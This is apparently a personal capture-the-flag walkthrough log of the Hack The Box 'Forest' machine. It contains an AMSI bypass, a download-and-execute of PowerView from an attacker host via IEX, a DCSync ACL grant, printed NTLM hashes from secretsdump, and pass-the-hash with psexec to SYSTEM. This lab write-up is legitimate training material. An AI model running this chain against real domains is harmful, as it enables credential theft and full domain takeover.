2023-02-09T16:42:50.7701505-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-02-09T16:42:50.7701505-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-02-09T16:43:21.4094902-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 44 MB RAM
2023-02-09T16:43:35.5187681-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-02-09T16:43:35.5656498-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-02-09T16:43:35.6281526-08:00|INFORMATION|Status: 161 objects finished (+161 3.659091)/s -- Using 51 MB RAM
2023-02-09T16:43:35.6281526-08:00|INFORMATION|Enumeration finished in 00:00:44.9828420
2023-02-09T16:43:35.7219072-08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-02-09T16:43:35.7375215-08:00|INFORMATION|SharpHound Enumeration Completed at 4:43 PM on 2/9/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/9/2023   4:43 PM          19051 20230209164334_BloodHound.zip
-a----         2/9/2023   4:43 PM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         2/9/2023   4:42 PM        1051648 SharpHound.exe
-ar---         2/8/2023  11:03 PM             34 user.txt

```


```
# took a few tries to even download
# DO NOT FOLLOW THIS TO DOWNLOAD FOLLOW TWO BLOCKS FROM NOW.
14:41
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> download "20230209164334_BloodHound.zip
Info: Downloading "20230209164334_BloodHound.zip to ./"20230209164334_BloodHound.zip

                                                             
Info: Download successful!
```

```
# setup bloodhound
14:42
┌──(root㉿kali)-[/home/kali/Downloads]
└─# neo4j console
┌──(root㉿kali)-[/home/kali/Downloads]
└─# bloodhound
```

```
## IN ORDER TO DOWNLOAD THE SHARPHOUND RESULTS FROM EVIL-WINRM I HAD TO SETUP AN SMB SERVER AND TRANSFER THAT WAY DUE TO THE DOWNLOADING NOT WORKING.
14:59

┌──(root㉿kali)-[/home/kali]
└─# smbserver.py share . -smb2support -username df -password df

*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> net use \\10.10.16.4\share /u:df df
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> copy 20230209165520_BloodHound.zip \\10.10.16.4\share\

┌──(root㉿kali)-[/home/kali]
└─# ls -la | grep 2023 
-rwxr-xr-x  1 root root 18603 Feb  9 19:55 20230209165520_BloodHound.zip


```

```
15:27
apt-get upgrade evil-winrm
```


```
# upgraded everything because winrm wasnt working properly

┌──(root㉿kali)-[/opt/PowerSploit/Recon]
└─# apt full-upgrade -y 

┌──(root㉿kali)-[/opt/PowerSploit/Recon]
└─# ps aux | grep -i apt


```


```
# FINALLY ABLE TO GET POWERVIEW.PS1 ONTO FOREST.HTB, HAD TO UPGRADE EVERYTHING AND USE UPLOAD COMMAND BELOW IN EVIL-WINRM, THE IEX METHOD WAS NOT WORKING.
15:45
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /opt/PowerSploit/Recon/PowerView.ps1
Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1

                                                             
Data: 1027040 bytes of 1027040 bytes copied

Info: Upload successful!

dir
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/9/2023   5:52 PM         770280 PowerView.ps1

# PowerView is actually not supposed to be on the box, it is almost like a powershell addon that gets invoked with IEX and allows for more commands.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```


```
# did not working, trying below.

15:48
$pass = convertto-securestring 'abc123!' -AsPlainText -Force
$cred = new-object system.management.automation.pscredential('HTB\john', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync

```


```
# breaking from 4:15 to 4:45
# this box is fucked because of code rot - 5 year old box, im calling it quits. going to markdown everything I learned in lessons learned and move on.

```

```powershell
17:17

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/PowerView.ps1') | IEX
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
$pass = convertto-securestring 'abc123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
$cred = new-object system.management.automation.pscredential('HTB\john', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

- image 36
```

```
# once DCSync is active on the user we are able to secretdump.py to get domain admin credentials to psexec onto actual admin.
```

```
17:26
┌──(root㉿kali)-[/usr/local/bin]
└─# secretsdump.py htb/john@10.10.10.161
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::

- image 37

```

```bash
17:28

┌──(kali㉿kali)-[~]
└─$ psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file IWqFDLIa.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service ISFY on 10.10.10.161.....
[*] Starting service ISFY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```
# root.txt
17:31
C:\Users\Administrator\Desktop> type root.txt
2549b5a4dec732e47c8e8b9e81dd3fc7

```


```
#bellinger helped me out luckily and explained that the IEX only invokes the powerView.ps1, it doesn't put the file onto the box like you would on a reguler winpeas box.
#Bypass-4MSI command in evil-winrm patches the firewall which allows for following commands
# $pass command used to assign john's password
# $cred command assigns the domain\user and pass.
# Add-DomainObjextAcl allows john to use DCSync
# once DCSync is active on the user we are able to secretdump.py to get domain admin credentials to psexec onto actual admin.
# once we have a successful secrets dump we were able to psexec.py on as domain admin.
```